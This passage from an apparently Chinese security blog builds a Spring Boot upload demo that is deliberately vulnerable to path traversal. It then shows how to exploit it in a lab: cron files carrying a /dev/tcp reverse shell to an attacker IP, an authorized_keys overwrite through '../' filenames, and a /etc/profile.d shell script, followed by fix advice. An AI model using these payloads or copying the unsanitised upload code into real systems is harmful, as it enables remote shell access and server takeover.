class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;version&gt;2.8.2&lt;/version&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/plugin&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;/plugins&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/pluginManagement&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &lt;resources&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;resource&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;directory&gt;src/main/resources&lt;/directory&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;includes&gt;</span></span><br><span class=\"line\"><span class=\"string\">          &lt;include&gt;**/*.*&lt;/include&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;/includes&gt;</span></span><br><span class=\"line\"><span class=\"string\">        &lt;filtering&gt;true&lt;/filtering&gt;</span></span><br><span class=\"line\"><span class=\"string\">      &lt;/resource&gt;</span></span><br><span class=\"line\"><span class=\"string\">    &lt;/resources&gt;</span></span><br><span class=\"line\"><span class=\"string\">  &lt;/build&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/project&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br></pre></td></tr></table></figure>\n<p>创建一个文件，命名为application.yml，放在resources(原本没有，需要创建)</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">server:</span><br><span class=\"line\">  port: 8091</span><br></pre></td></tr></table></figure>\n<p>创建一个包，然后在里面创建一个Controller</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/6/2</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 21:28</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"meta\">@RequestMapping(&quot;/upload&quot;)</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FileUploadHandler</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&quot;/index&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">upload</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;index...&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"mneJQZ2ipF-gG62PrXKr81ofOpE505V_5LxwpngyMpk.png\" alt=\"image\"></p>\n<p>创建一个启动类Application进行测试，注意启动类是放在controller的上一层</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.SpringApplication;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/6/2</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 21:31</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Application</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        SpringApplication.run(Application.class,args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"Exco-E0VA0wqPqXgMVvYFh12-2UY4yrQ9kagV1HX8xk.png\" alt=\"image\"></p>\n<p>访问测试，成功打印了index… ；说明我们的项目没有问题了</p>\n<p><img src=\"iDHLMQQEZgtWRQ-pW3bQgUvigAYEIlS35YhTK63V5r0.png\" alt=\"image\"></p>\n<h3 id=\"文件上传的demo\"><a href=\"#文件上传的demo\" class=\"headerlink\" title=\"文件上传的demo\"></a>文件上传的demo</h3><p>这里写一个REST 风格的控制器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Path;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Paths;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garck3h</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Date</span>: 2023/6/2</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Time</span>: 21:56</span></span><br><span class=\"line\"><span class=\"comment\"> * Life is endless, and there is no end to it.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"meta\">@RestController</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">FileUploadController</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@PostMapping(&quot;/upload&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">uploadFile</span><span class=\"params\">(<span class=\"meta\">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file.isEmpty()) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件为空!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 获取项目资源路径</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">resourcePath</span> <span class=\"operator\">=</span> System.getProperty(<span class=\"string\">&quot;user.dir&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// 定义存储文件的目录路径和文件全名</span></span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">folderPath</span> <span class=\"operator\">=</span> resourcePath + File.separator + <span class=\"string\">&quot;data&quot;</span> + File.separator + <span class=\"string\">&quot;upload&quot;</span> + File.separator;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> file.getOriginalFilename();</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;folderPath1：&quot;</span>+folderPath);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// 若文件夹不存在，则创建文件夹</span></span><br><span class=\"line\">            <span class=\"type\">File</span> <span class=\"variable\">folderDir</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">File</span>(folderPath);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!folderDir.exists()) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//使用mkdirs可以创建多级目录，mkdir只能创建一级目录</span></span><br><span class=\"line\">                folderDir.mkdirs();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// 将上传的文件写入磁盘</span></span><br><span class=\"line\">            <span class=\"type\">byte</span>[] bytes = file.getBytes();</span><br><span class=\"line\">            <span class=\"type\">Path</span> <span class=\"variable\">path</span> <span class=\"operator\">=</span> Paths.get(folderPath + fileName);</span><br><span class=\"line\">            Files.write(path, bytes);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件上传成功!\\n&quot;</span>+ <span class=\"string\">&quot;路径：&quot;</span>+ path;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件上传失败!&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>前端的upload.html放在webapp目录中</p>\n<p>upload.html</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span><br><span class=\"line\">    &lt;title&gt;File Upload&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div&gt;</span><br><span class=\"line\">    &lt;form action=<span class=\"string\">&quot;/upload&quot;</span> method=<span class=\"string\">&quot;POST&quot;</span> enctype=<span class=\"string\">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class=\"line\">        &lt;label <span class=\"keyword\">for</span>=<span class=\"string\">&quot;file&quot;</span>&gt;选择文件:&lt;/label&gt;</span><br><span class=\"line\">        &lt;input type=<span class=\"string\">&quot;file&quot;</span> name=<span class=\"string\">&quot;file&quot;</span> id=<span class=\"string\">&quot;file&quot;</span>&gt;&lt;br&gt;&lt;br&gt;</span><br><span class=\"line\">        &lt;button type=<span class=\"string\">&quot;submit&quot;</span>&gt;Upload&lt;/button&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>访问ip:port&#x2F;upload.html；进行文件上传</p>\n<p><img src=\"wPg3ggGvrpfNYLYDCyN1nc4dQz42CznP0j1ZQVixRxY.png\" alt=\"image\"></p>\n<p>上传成功</p>\n<p><img src=\"WGAt0yGrhfdXbrH6oAAoQsLr0thekpiAFk7OygfLqy0.png\" alt=\"image\"></p>\n<h3 id=\"打包为jar部署到Linux\"><a href=\"#打包为jar部署到Linux\" class=\"headerlink\" title=\"打包为jar部署到Linux\"></a>打包为jar部署到Linux</h3><p>修改一下pom.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">   </span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 修改一： --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">packaging</span>&gt;</span>jar<span class=\"tag\">&lt;/<span class=\"name\">packaging</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!-- 修改二：   --&gt;</span></span><br><span class=\"line\"> <span class=\"tag\">&lt;<span class=\"name\">plugins</span>&gt;</span></span><br><span class=\"line\">      <span class=\"comment\">&lt;!-- 保留jar插件 --&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">plugin</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">plugins</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>打包</p>\n<p><img src=\"VXATVhlY5wJYk0oify4c9vRQONdzyplim76_ffj9iC4.png\" alt=\"image\"></p>\n<p>把FileUploadHazards.jar上传到Linux的&#x2F;tmp进行启动。</p>\n<p><img src=\"iPsmnagjEdqeXm3IfZCu0ZQ4pyF8Ans1hptIYUaBt4k.png\" alt=\"image\"></p>\n<p>由于我们这里没有tomcat了，所以没办法访问upload.html来进行文件上传。但我们可以通过burp发包访问接口来上传。</p>\n<p><img src=\"w-T-uEWIvr7VE0c8qV5Sclx78sDAFm8MCIGrGbdyB2M.png\" alt=\"image\"></p>\n<p>查看服务器成功看到了我们上传的123.jpg</p>\n<p><img src=\"9Vjk45DGx0fjcBLIPia2KhUQHqawRsCG0MM5TzveXEI.png\" alt=\"image\"></p>\n<h3 id=\"利用-x2F-指定文件存储目录\"><a href=\"#利用-x2F-指定文件存储目录\" class=\"headerlink\" title=\"利用..&#x2F;指定文件存储目录\"></a>利用..&#x2F;指定文件存储目录</h3><p>尝试通过..&#x2F;来把我们上传的文件放到上一层目录，也就是我们的&#x2F;tmp&#x2F;data目录下。下图可见成功控制存储到了上一层目录</p>\n<p><img src=\"voFm36i6iPJqyHd-aNc-bPj0mmMrv4Q7zeg6P7CeN3o.png\" alt=\"image\"></p>\n<h2 id=\"利用姿势一-定时任务\"><a href=\"#利用姿势一-定时任务\" class=\"headerlink\" title=\"利用姿势一(定时任务)\"></a>利用姿势一(定时任务)</h2><p>由于crond 守护进程在后台静默地检查 &#x2F;etc&#x2F;crontab 文件和&#x2F;var&#x2F;spool&#x2F;cron 及 &#x2F;etc&#x2F;cron.d&#x2F;目录。</p>\n<p>定时任务的路径有</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/<span class=\"keyword\">var</span>/spool/cron/root   #文件要以用户名称存在</span><br><span class=\"line\">/etc/cron.d            #这里的文件（任意名称和后缀），也会被轮询加载执行</span><br><span class=\"line\">/etc/cron.daily/       #下面的任务都是每天<span class=\"number\">6</span>：<span class=\"number\">25</span> 执行</span><br><span class=\"line\">/etc/cron.weekly/      #下面的任务都是每周日 <span class=\"number\">6</span>：<span class=\"number\">47</span> 执行</span><br><span class=\"line\">/etc/cron.monthly/     #下面的任务都是每月<span class=\"number\">1</span>号 <span class=\"number\">6</span>：<span class=\"number\">52</span> 执行</span><br></pre></td></tr></table></figure>\n<p>用法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>    <span class=\"number\">12</span>   *   *   *   echo rce &gt;&gt; /tmp/hello</span><br><span class=\"line\">#分  时   日   月  周  |《==============命令行=======================》|</span><br></pre></td></tr></table></figure>\n<p>查看crond的运行状态</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">service crond status</span><br></pre></td></tr></table></figure>\n<p><img src=\"lPBuRzds7-sLeJ86IlkSlaKHu2k9rmgB9Q5CCafFoqE.png\" alt=\"image\"></p>\n<h3 id=\"利用路径一\"><a href=\"#利用路径一\" class=\"headerlink\" title=\"利用路径一\"></a>利用路径一</h3><p>条件：</p>\n<ul>\n<li>目标服务器的cron正常运行</li>\n<li>上传路径可以控制</li>\n<li>可以上传任意后缀文件，因为这里需要上传root命名的文件</li>\n</ul>\n<p>上传到：&#x2F;var&#x2F;spool&#x2F;cron&#x2F; （需要有读写的权限）</p>\n<p>nc监听</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -lvnp <span class=\"number\">7799</span>  #直接监听</span><br><span class=\"line\">nc -lvnp <span class=\"number\">7799</span> -s <span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span> #指定IP监听</span><br></pre></td></tr></table></figure>\n<p> 上传文件到  &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p>\n<p> 上传文件到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">*/<span class=\"number\">1</span>  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span>/<span class=\"number\">7799</span> <span class=\"number\">0</span>&gt;&amp;<span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>上传的文件名需为用户名称，如：root、test等用户</p>\n<p><img src=\"2NFurrmX1tT7Guq9hNa0Z9-SU5VDlKI6OERFtbisSeU.png\" alt=\"image\"></p>\n<p>这里踩了个坑，因为我攻击机是win，然后目标是Linux，换行会涉及到一些编码的问题，直到我在notepad++上转为Unix之后才能成功。</p>\n<p><img src=\"x67OuJ4x5fgfB7K54tK15ZuJaCdo2rPDkD0J60-MPI8.png\" alt=\"image\"></p>\n<p>成功反弹shell</p>\n<p><img src=\"0imi-hY6u5bns_al8-Dpqg1a0gTEfcWlxOSj8_a3HCQ.png\" alt=\"image\"></p>\n<h3 id=\"利用路径二\"><a href=\"#利用路径二\" class=\"headerlink\" title=\"利用路径二\"></a>利用路径二</h3><p>条件</p>\n<ul>\n<li><p>目标服务器的crond正常运行</p>\n</li>\n<li><p>上传路径可以控制</p>\n</li>\n<li><p>对&#x2F;etc&#x2F;cron.d目录有写入权限即可，后缀名不限</p>\n</li>\n</ul>\n<p>因为在&#x2F;etc&#x2F;cron.d这个目录下，任意后缀的文件都可以执行，我们创建一个每分钟执行一次的定时任务；并且把结果输出到&#x2F;tmp下的haha文件中（注意这里要添加一个用户名）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">*/<span class=\"number\">1</span>  *  *  *  *   root /bin/bash -i&gt;&amp;/dev/tcp/<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.133</span>/<span class=\"number\">7799</span> <span class=\"number\">0</span>&gt;&amp;<span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>首先我们确认&#x2F;var&#x2F;spool&#x2F;cron下是没有任何文件的</p>\n<p><img src=\"2A3ex48KgqF9Ql6WN6Iv6L141g7dL_y52uhe8qu1Wzk.png\" alt=\"image\"></p>\n<p>burp上传</p>\n<p><img src=\"N1O8-V_1aCtxhLa9G0zhlopo-lQGW2WQVlZm47AqEYw.png\" alt=\"image\"></p>\n<p>nc进行监听</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -lvnp <span class=\"number\">7799</span>  #直接监听</span><br></pre></td></tr></table></figure>\n<p>成功反弹shell</p>\n<p><img src=\"bSH3OXbHwr4w4dHdzIFEgegftTMo_mA_IAbLHnuEF7k.png\" alt=\"image\"></p>\n<h2 id=\"利用姿势二（替换公钥）\"><a href=\"#利用姿势二（替换公钥）\" class=\"headerlink\" title=\"利用姿势二（替换公钥）\"></a>利用姿势二（替换公钥）</h2><p>利用条件：</p>\n<ul>\n<li><p>上传路径可以控制</p>\n</li>\n<li><p>对文件名无限制</p>\n</li>\n<li><p>目标开启ssh端口</p>\n</li>\n<li><p>支持密钥登录</p>\n</li>\n</ul>\n<h3 id=\"生成公私钥\"><a href=\"#生成公私钥\" class=\"headerlink\" title=\"生成公私钥\"></a>生成公私钥</h3><p>使用ssh-keygen生成公钥和私钥</p>\n<p>ssh-keygen -t “加密方式” -C“描述”</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p>三次回车即可</p>\n<p><img src=\"UIHjG8HHEdBNN6B5RMh_lyY3IxMvTVm13AwogI0HPxo.png\" alt=\"image\"></p>\n<p>安装公钥</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cd /root/.ssh</span><br><span class=\"line\">cat id_rsa.pub &gt;&gt; authorized_keys</span><br></pre></td></tr></table></figure>\n<p><img src=\"8v_pdpxtzMKK3unNGR9ldrJy_tNtxFxKC6qU3NPaiMk.png\" alt=\"image\"></p>\n<p>更改权限</p>\n<p>authorized_keys需要600</p>\n<p>.ssh需要700</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod <span class=\"number\">600</span> ~/.ssh/authorized_keys</span><br><span class=\"line\">chmod <span class=\"number\">700</span> ~/.ssh</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"开启公钥登录\"><a href=\"#开启公钥登录\" class=\"headerlink\" title=\"开启公钥登录\"></a>开启公钥登录</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">vim /etc/ssh/sshd_config</span><br><span class=\"line\">PubkeyAuthentication no改为yes</span><br></pre></td></tr></table></figure>\n<p><img src=\"sVic4p5hZcyvGEYzU_kckPrS9KCWX5V23amwZL7iB9s.png\" alt=\"image\"></p>\n<p>重启ssh服务</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl restart sshd.service</span><br></pre></td></tr></table></figure>\n<h3 id=\"攻击者生成公钥\"><a href=\"#攻击者生成公钥\" class=\"headerlink\" title=\"攻击者生成公钥\"></a>攻击者生成公钥</h3><p>使用ssh-keygen生成公钥和私钥</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"vmN311G5GMwurYSwNknSgmf9XnjgG46zKYbbUYq_2MA.png\" alt=\"image\"></p>\n<p>把生成的id_rsa.pub上传到目标服务器</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">/../../../../../../../root/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p><img src=\"7xZAqA1rvcxD2ipf4lkvOjFnVgw0k4BidEAL6czMn2U.png\" alt=\"image\"></p>\n<p>在攻击者的机器上使用公钥成功连接目标</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh root@<span class=\"number\">192.168</span><span class=\"number\">.88</span><span class=\"number\">.104</span> -p <span class=\"number\">22</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"POxR2yuZM6rjd0boyPSmQklQvQwgNVM5vokAPETDRpw.png\" alt=\"image\"></p>\n<h2 id=\"利用姿势三（终端自启动）\"><a href=\"#利用姿势三（终端自启动）\" class=\"headerlink\" title=\"利用姿势三（终端自启动）\"></a>利用姿势三（终端自启动）</h2><p>条件：</p>\n<ul>\n<li>路径可以控制</li>\n<li>.sh后缀未被禁止</li>\n<li>对&#x2F;etc&#x2F;profile目录有写权限</li>\n</ul>\n<p>打开profile文件分析得知，用户打开bash窗口就会执行&#x2F;etc&#x2F;profile.d目录下所有.sh文件</p>\n<p><img src=\"tw-G7X0ckGwkYRW9uzgAtFbquGXN7vxYzwpBGQypdaU.png\" alt=\"image\"></p>\n<p>上传一个rce.sh后缀的文件到目标的&#x2F;etc&#x2F;profile.d目录下，其rce.sh的内容为反弹shell的内容</p>\n<p><img src=\"5M_X1qjCQagqhCZ1tVRDVsGRgWiX_FT7Vu4ZOzj3RQQ.png\" alt=\"image\"></p>\n<p>nc进行监听</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -lvnp <span class=\"number\">7799</span>  #直接监听</span><br></pre></td></tr></table></figure>\n<p>模拟管理员登录目标终端，成功在nc上接受到了shell</p>\n<p><img src=\"zmoOoI01LzlICJYnopinXNmyhsXCiydjP9RXXgLFX4s.png\" alt=\"image\"></p>\n<h2 id=\"修复建议\"><a href=\"#修复建议\" class=\"headerlink\" title=\"修复建议\"></a>修复建议</h2><ul>\n<li><p>对上传文件的类型进行检查，只允许上传指定的文件类型。</p>\n</li>\n<li><p>对上传文件的大小进行限制，以避免过大的文件占用服务器资源。</p>\n</li>\n<li><p>校验文件名称，过滤..&#x2F;</p>\n</li>\n<li><p>对上传文件进行重命名，以防止恶意覆盖其他文件或者构造路径遍历攻击。</p>\n</li>\n</ul>\n<h2 id=\"对demo进行简单修复\"><a href=\"#对demo进行简单修复\" class=\"headerlink\" title=\"对demo进行简单修复\"></a>对demo进行简单修复</h2><p>对文件重命名，这里添加上一个时间戳</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">fileName</span> <span class=\"operator\">=</span> System.currentTimeMillis() + <span class=\"string\">&quot;_&quot;</span> + file.getOriginalFilename();</span><br></pre></td></tr></table></figure>\n<p>检查是否包含..&#x2F;</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断文件名是否合法，即不存在 ../ 字符串</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (originalFileName.contains(<span class=\"string\">&quot;../&quot;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 文件名不合法，抛出异常或给出提示信息</span></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 文件名合法，执行保存操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>限制文件类型</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 定义允许上传的文件类型</span></span><br><span class=\"line\">List&lt;String&gt; allowedExtensions = Arrays.asList(<span class=\"string\">&quot;png&quot;</span>, <span class=\"string\">&quot;jpg&quot;</span>, <span class=\"string\">&quot;gif&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 获取上传文件的后缀名</span></span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">originalFileName</span> <span class=\"operator\">=</span> file.getOriginalFilename();    </span><br><span class=\"line\"><span class=\"type\">String</span> <span class=\"variable\">extension</span> <span class=\"operator\">=</span> originalFileName.substring(originalFileName.lastIndexOf(<span class=\"string\">&#x27;.&#x27;</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 判断文件类型是否在允许的范围内</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!allowedExtensions.contains(extension)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&quot;文件类型不合法!&quot;</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 文件类型合法，执行保存操作</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最终的demo</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.controller;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.File;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Files;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.nio.file.Path;</span><br><span class=\"line\"><span 